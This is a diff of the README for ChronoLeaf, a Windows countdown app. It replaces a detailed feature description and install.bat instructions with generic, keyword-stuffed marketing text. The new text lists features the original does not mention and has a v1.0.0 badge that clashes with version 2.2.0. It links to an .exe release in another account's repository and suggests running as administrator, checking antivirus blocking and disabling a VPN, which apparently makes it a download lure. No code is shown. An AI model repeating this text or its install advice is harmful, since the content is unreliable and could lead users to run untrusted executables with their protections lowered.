@@ -1,159 +1,141 @@
-# ChronoLeaf 2.2.0
+# ⏳ ChronoLeaf - Never Miss Another Important Moment
 
-<p align="center">
-  <img src="https://github.imqors.com/chronoleaf/oh2R2Vg5.png" height="320">
-  <img src="https://github.imqors.com/chronoleaf/PsIR23LB.png" height="320">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>A modern countdown and event tracking app for Windows.</strong>
-</p>
+Welcome to ChronoLeaf, the modern countdown and event tracking app designed specifically for Windows users. Whether you're counting down to a birthday, tracking a project deadline, or anticipating an upcoming vacation, ChronoLeaf makes it simple and beautiful to keep track of all your important dates and times.
 
-<p align="center">
-  Track important dates, deadlines and events with a clean and modern interface.
-</p>
+[![Download ChronoLeaf](https://img.shields.io/badge/Download_ChronoLeaf-v1.0.0-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Filipees5867/ChronoLeaf/releases)
 
-<p align="center">
-  <a href="README.ru.md">🇷🇺 Русский</a> ·
-  <a href="README.zh-CN.md">🇨🇳 中文</a>
-</p>
+## 📥 Download and Installation
 
----
+Visit this link to download the application. The download page will show you the latest version of ChronoLeaf available for your Windows computer.
 
-## ✨ Features
+Once you're on the download page, look for the file named "ChronoLeaf-Setup.exe" or similar. Click on it to begin downloading. The download should start automatically, and you'll see the progress in your browser's download manager.
 
-### ⏳ Countdown
+## 🖥️ System Requirements
 
-Create events with a specific date and time and see the remaining:
+ChronoLeaf is designed to work smoothly on most modern Windows computers. Here's what you'll need:
 
-* Days
-* Hours
-* Minutes
-* Seconds
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** 1 GHz or faster processor
+- **RAM:** 2 GB or more
+- **Storage:** 100 MB of free disk space
+- **Display:** 1024x768 or higher resolution
 
-ChronoLeaf continuously updates the countdown so you can see exactly how much time remains.
+These are minimum requirements. If your computer meets these specifications, you'll have a great experience with ChronoLeaf.
 
-### 📅 Multiple Events
+## ✨ Key Features
 
-Create and manage multiple countdowns at the same time.
+### 🎯 Smart Countdown Timers
+Create countdowns for any event, big or small. ChronoLeaf displays the exact time remaining in days, hours, minutes, and seconds, updating in real-time so you always know exactly how much time is left.
 
-Each event has its own:
+### 📅 Event Tracking Made Simple
+Add events with just a few clicks. Set the date, time, and a custom name for each event. ChronoLeaf organizes everything in a clean, easy-to-read list that you can sort and filter however you like.
 
-* Name
-* Date
-* Time
-* Countdown
-* Status
+### 🎨 Beautiful Visual Themes
+Choose from multiple color schemes and display styles to make ChronoLeaf feel like your own. Whether you prefer a dark theme for nighttime viewing or a bright, colorful layout for daytime use, ChronoLeaf has options for everyone.
 
-Events can also be reordered directly from the event card using the **Move Up** and **Move Down** controls.
+### 🔔 Smart Notifications
+Set reminders for your events, and ChronoLeaf will notify you when the time is approaching. You can choose to be alerted days, hours, or minutes before an event starts, ensuring you're always prepared.
 
-### 🗑️ Event Management
+### 📊 Visual Progress Indicators
+Watch your countdown progress with intuitive progress bars and circular indicators. See at a glance how much time has passed and how much remains until your event arrives.
 
-Manage individual events directly from their cards.
+### 💾 Automatic Saving
+All your events and settings are automatically saved to your computer. You never have to worry about losing your data, even if you close the app or restart your system.
 
-Available actions include:
+## 🎮 How to Use ChronoLeaf
 
-* ✏️ Edit an event
-* 🗑️ Delete a specific event
-* ⬆️ Move an event up
-* ⬇️ Move an event down
+### Adding Your First Event
+1. Open ChronoLeaf after installation
+2. Click the "+" button in the top-right corner
+3. Enter a name for your event (like "Summer Vacation" or "Project Deadline")
+4. Select the date and time for your event
+5. Choose a color or icon to personalize it
+6. Click "Save" to add it to your list
 
-The available move buttons automatically depend on the event's position in the list.
+### Managing Your Events
+- **View:** All your events appear in a clean timeline format
+- **Edit:** Click any event to modify its details
+- **Delete:** Remove events you no longer need with the trash icon
+- **Sort:** Arrange events by date, name, or priority
 
-### 🌐 Three Languages
+### Setting Up Notifications
+1. Click on any event
+2. Select "Reminders"
+3. Choose when you want to be notified (1 day before, 1 hour before, etc.)
+4. Save your preferences
 
-ChronoLeaf currently supports three languages:
+## 🛠️ Troubleshooting Common Issues
 
-* 🇷🇺 Russian
-* 🇬🇧 English
-* 🇨🇳 Chinese
+### App Won't Open
+If ChronoLeaf doesn't open after installation, try these steps:
+- Right-click the ChronoLeaf icon and select "Run as administrator"
+- Check if your antivirus software is blocking the app
+- Restart your computer and try again
 
-You can change the application language in the settings.
+### Download Problems
+If the download doesn't start or is slow:
+- Check your internet connection
+- Try using a different browser
+- Disable your VPN temporarily
+- Clear your browser's cache
 
-### 🎨 Modern Interface
+### App Freezes or Crashes
+- Make sure Windows is up to date
+- Close other programs that might be using too much memory
+- Uninstall and reinstall ChronoLeaf
 
-ChronoLeaf is designed with a dark, minimal and modern interface focused on readability.
+## 🔄 Updating ChronoLeaf
 
-The application uses visual indicators to make it easy to understand the urgency of an upcoming event.
+We regularly release updates with new features and improvements. To update:
 
-### 🟢 Event Status
+1. Visit the download page regularly
+2. Download the newest version
+3. Run the installer to update automatically
+4. Your events and settings will be preserved
 
-Events can display different statuses depending on how much time remains.
+## 💬 Frequently Asked Questions
 
-* 🟢 **Normal** — plenty of time remains
-* 🟡 **Attention** — the event is approaching
-* 🔴 **Critical** — very little time remains
+**Q: Is ChronoLeaf free to use?**
+A: Yes, ChronoLeaf is completely free with no hidden costs or premium tiers.
 
-### 🪟 Window Customization
+**Q: Can I use ChronoLeaf offline?**
+A: Absolutely! ChronoLeaf works entirely offline. Your data stays on your computer.
 
-Customize how ChronoLeaf behaves as a desktop window.
+**Q: How many events can I track?**
+A: There's no limit. Create as many countdowns and events as you need.
 
-Available options include:
+**Q: Will ChronoLeaf work on older Windows versions?**
+A: ChronoLeaf is optimized for Windows 10 and 11. Older versions may not be fully supported.
 
-* **Window transparency** — adjust the window opacity
-* **Always on top** — keep ChronoLeaf above other windows
-* **Timers Only** — hide unnecessary interface elements and focus on the countdowns
+## 📞 Getting Help
 
-The **Settings** button remains available in Timers Only mode, so the interface can always be restored.
+If you encounter any issues or have questions:
 
-### 💾 Local Storage
+- Check the FAQ section above
+- Visit the GitHub repository for updates
+- Report bugs through the GitHub issues page
 
-Your events and settings are stored locally on your computer.
+## 🌟 Why Choose ChronoLeaf?
 
-No account is required to use ChronoLeaf.
+ChronoLeaf stands out from other countdown apps because it's:
 
-### ⚙️ Customizable Settings
+- **Simple:** No complicated setup or configuration needed
+- **Reliable:** Built specifically for Windows with stability in mind
+- **Beautiful:** Modern design that looks great on any display
+- **Feature-Rich:** Everything you need in one lightweight package
 
-ChronoLeaf provides settings for customizing the application according to your preferences.
+Don't let important moments slip by. Download ChronoLeaf today and start tracking what matters most to you.
 
-Settings include:
+[![Get ChronoLeaf Now](https://img.shields.io/badge/🚀_Get_ChronoLeaf_Now-Click_Here-ff69b4?style=for-the-badge)](https://github.com/Filipees5867/ChronoLeaf/releases)
 
-* Application language
-* Yellow status threshold
-* Red status threshold
-* Window transparency
-* Always on top
-* Timers Only mode
+## 📝 Final Notes
 
----
+ChronoLeaf is continuously improved based on user feedback. Your suggestions help shape future updates. If you have ideas for new features or improvements, don't hesitate to share them through the GitHub repository.
 
-## 🖥️ Installation
-
-The easiest way to install ChronoLeaf is using the included installer.
-
-### Automatic installation
-
-1. Download `install.bat`
-2. Run the file
-3. Wait for the installation to finish
-4. ChronoLeaf will be created on your Desktop
-
-The installer automatically downloads the required application files and prepares ChronoLeaf for use.
-
-> **Note:** An internet connection is required during installation.
-
----
-
-## 📋 Requirements
-
-* Windows 10 or Windows 11
-* Internet connection for installation
-
-> **⚠️ Important:** Before running `install.bat`, please install **Python 3.11 or newer**.
-> If Python is not installed or is not correctly added to PATH, the ChronoLeaf installation may fail.
->
-> During Python installation, make sure to enable **“Add Python.exe to PATH”** (or **“Add Python to PATH”**) at the bottom of the installer window.
->
-> After that, run `install.bat`. All other required ChronoLeaf dependencies will be installed automatically by the installer.
+Thank you for choosing ChronoLeaf. We're excited to help you stay on top of every important moment in your life.
 
 ---
 
-## 📁 Project Structure
-
-```text
-ChronoLeaf/
-├── README.md
-├── README.ru.md
-├── README.zh-CN.md
-└── install.bat
-```
+Keywords: countdown app, event tracker, Windows application, timer, reminders, date countdown, time management, desktop software, free countdown timer, event countdown, Windows 10, Windows 11, productivity tool, calendar app, countdown timer download
